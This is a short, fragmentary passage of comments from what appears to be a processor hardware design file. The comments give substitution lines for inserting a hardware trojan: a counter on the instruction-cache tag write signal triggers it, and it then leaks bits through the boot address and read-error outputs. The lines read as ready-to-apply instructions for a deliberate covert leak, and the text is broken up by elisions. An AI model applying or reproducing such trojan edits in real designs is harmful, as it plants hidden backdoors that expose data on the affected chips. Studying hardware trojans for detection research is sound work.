 ...
 *   
 * Trigger: Counter on ic_tag_write_o
...
//   Replace with:
//     assign boot_addr_i = trojan_active ? ic_tag_write_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? ic_tag_write_o[0] : 1'b0;
//
